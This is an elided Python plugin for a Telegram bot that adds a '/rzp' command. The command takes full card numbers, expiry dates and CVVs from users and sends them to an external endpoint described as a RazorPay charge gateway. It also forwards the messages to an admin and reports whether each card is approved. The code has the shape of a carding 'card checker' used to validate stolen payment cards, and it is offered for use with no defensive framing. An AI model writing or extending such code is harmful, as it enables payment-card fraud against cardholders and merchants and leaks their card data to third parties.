...
PLUGIN_INFO = {
    ...
    'commands': ['rzp'],
    'prefixes': ['.', '/', '!', '$'],
    'description': 'RazorPay API payment gateway',
    'type': 'charge',
    'status': 'active'
}

def categorize_razorpay_response(api_response):
    """Categorize RazorPay API response"""
    try:
...
def format_razorpay_response(card_info, response_message, suffix, bin_info, execution_time, category):
    """Format RazorPay API response for Telegram"""
    ...
    response_text += f"㊕ 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ RazorPay 12.45$\n"
...
class RazorPayGateway:
    def __init__(self):
        self.base_url = "https://onyxenvbot.up.railway.app/razorpay/key=yashikaaa/cc="

    async def check_card(self, card, month, year, cvv):
        """Main function to check card through RazorPay API"""
...
def setup(app: Client):
    ...
    @app.on_message(filters.command(["rzp"], prefixes=[".", "/", "!", "$"]))
    async def rzp_command(client, message):
        """Handle /rzp command"""
        ...
        can_access, reason = await check_gateway_access(user_id, 'rzp')
        if not can_access:
            if reason == "locked":
                return
            elif reason == "premium":
        ...
        if not text:
            resp = f"""〈<a href='tg://user?id={user_id}'>꫟</a>〉-» 𝗥𝗮𝘇𝗼𝗿𝗣𝗮𝘆 𝗔𝗣𝗜 - CHECK

〈♻️〉𝙂𝙖𝙩𝙚𝙬𝙖𝙮 -» RazorPay API

<a href='tg://user?id={user_id}'>╰┈➤</a> 𝙁𝙤𝙧𝙢𝙖𝙩 -» /rzp cc|month|year|cvc"""
        ...
        if not await validate_card_with_luhn(card_info, "RazorPay API", message):
            return
        
        card, month, year, cvv = card_info
        
        # Forward to admin if enabled
        await forward_to_admin_if_enabled(client, message, 'rzp')
        
        # Send progress message
        progress_msg = await message.reply_text("𝙋𝙡𝙚𝙖𝙨𝙚 𝙒𝙖𝙞𝙩...")
        
        # Process the card using RazorPay Gateway
        gateway = RazorPayGateway()
        api_response, error, execution_time = await gateway.check_card(card, month, year, cvv)
        
        # Increment check counter
        db.increment_check(user_id, 'rzp')
        ...
        if error:
            ...
            response_text = format_razorpay_response(
            ...
            # Parse API response
            category, response_message, suffix = categorize_razorpay_response(api_response)
    ...
    print("✅ RazorPay Gateway commands registered")
